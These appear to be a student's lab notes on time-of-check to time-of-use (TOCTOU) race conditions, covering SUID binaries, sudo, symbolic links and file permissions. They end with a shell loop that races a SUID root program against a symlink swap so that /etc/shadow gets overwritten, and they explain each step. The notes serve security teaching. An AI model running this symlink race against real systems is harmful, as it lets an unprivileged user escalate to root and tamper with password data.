## Learning Objective

- [ ] Understand what a TOCTOU bug is and why it is prone to attacks  
- [ ] Detect race conditions caused by TOCTOU bugs  
- [ ] Provide a fix to a TOCTOU vulnerability  
- [ ] Examine file permissions and modify them using `chmod`, `chown`, `ls -l`  
- [ ] Understand the concept of privileged programs: user level vs root level  
- [ ] Compile programs and make documents with different privilege levels  
- [ ] Understand how `sudo` works and how it elevates privileges  
- [ ] Understand the difference between symbolic and hard links (`ln` vs `ln -s`)  

---
# Toctou bug

Time-of-Check to Time-of-Use is a **race condition vulnerability**. 
	When a program checks a condition (like file permissions) and then **acts on it later**, assuming the condition hasn’t changed. In between, an attacker can **swap the file** or resource, tricking the system into doing something unsafe

- This allows **regular users to escalate privileges**
- The attacker changes the resource (e.g., replacing a user file with a symbolic link to `/etc/shadow`) **between check and use**, gaining unauthorized access or control.

---
## File Permission
The reason you faced the **permission denied** error is because your username doesn’t have the correct **permission** to edit the `Root/` directory.
![[Pasted image 20250605162217.png|500]]

```bash
-rwxr-xr-x 1 root root 16840 Jun  5 16:27 root_prog_nosuid
```
 `-` : Regular file
- `rwx` : Owner (`root`) has read, write, execute
- `r-x` : Group has read and execute
- `r-x` : Others have read and execute
- No `s` → **SUID is not set**
- **Runs as the user who calls it** (no privilege escalation)

```bash
-rwsr-xr-x 1 root root 16408 ...
```
- `s` replaces the owner execute bit → **SUID is set** [[#SUID bit]]
- Meaning: When executed, this program runs with the **effective UID of the file owner**, which is **root**
- So even if a **normal user runs `rootdo`**, it runs with **root privileges**
- This is used intentionally to elevate permission for controlled tasks

```bash
-rwsr-xr-x 1 root root 16840 ...
```
- Same as `rootdo`, **SUID is set**
- Also owned by `root`
- This is the **vulnerable program** you attack in the TOCTOU lab:
    - Because of the SUID and the timing gap (access → sleep → fopen),
    - A regular user can exploit it to **modify `/etc/shadow`**

---
## SUID bit
SUID stand for Set Owner User ID. A file with **SUID** set always **executes** as the user who **owns** the file, regardless of the user passing the command.

The **SUID** bit allows **normal** user to gain **elevated privilege** (this does **NOT** mean Kernel Mode, just privilege levels among regular users) when executing this program.
If a normal user executes this program, this program runs in root **privileges** (basically, the creator of the program)

---
## Attacking process 
### Reading protected file using regular user account.
``` bash
cat /etc/shadow -> cat: /etc/shadow: Permission denied
```
Met with **permission denied** because this file can only be read by `root` user, and other users in the **same group** 

```bash
test-user-1@DESKTOP-9K3T8HM: ../lab_toctou$ ./Root/rootdo cat /etc/shadow
```
The **reason** you can now successfully read the file `/etc/shadow` is because `rootdo` **has the SUID bit**. Any other program that is **executed** by `rootdo` will run with `root` (`rootdo` creator) privileges and **not** the regular user.

---
## sudo
Allows a permitted user to execute a command as the superuser or another user, as specified in the sudoers file (`/etc/sudoers`). 
This provides a mechanism for granting administrator privileges, ordinarily reserved for the root user, to normal users in a controlled manner.

---
# The Vulnerable Program

---
# The TOCTOU Bug

A class of software bug caused by a race condition involving:

- The **checking** of the state of a part of a system (such as this check in `vulnerable_root_prog` using `access`),
- And the **actual use** of the results of that check

We **exaggerate** the `DELAY` between:

1. The time of **CHECK** of the file using `access` and
2. The time of **USE** (actual usage of the file) using `fopen` by setting `sleep(DELAY)` in betweewhatn the two instructions, where `DELAY` is specified as 1 to simulate 1 second delay.

## Symbolic Link
A **symbolic** link is a special kind of file that points to another file. It contains a text string that is **automatically interpreted** and followed by the OS as a path to another file or directory.



--- 
# The Attack
```sh
OLDFILE=`ls -l /etc/shadow`
NEWFILE=`ls -l /etc/shadow`

while [ "$OLDFILE" = "$NEWFILE" ]
do
    rm -f userfile.txt
    cp userfile_original.txt userfile.txt

    ../Root/vulnerable_root_prog userfile.txt test-user-0 & 
    ln -sf /etc/shadow userfile.txt & 
    NEWFILE=`ls -l /etc/shadow`
done
```

    ../Root/vulnerable_root_prog userfile.txt test-user-0 & 
    ln -sf /etc/shadow userfile.txt & 
- These two commands run **at the same time** (`&` runs them in background):

	**a.** `vulnerable_root_prog`:
	- Checks if the user has write access to `userfile.txt` (it does — at first).
	- Waits for 1 second (using `sleep(1)`)
	- Then opens it and modifies it — **but by that time, it may have changed!**

	**b.** `ln -sf /etc/shadow userfile.txt`:
	- Replaces `userfile.txt` with a **symbolic link** to `/etc/shadow`.

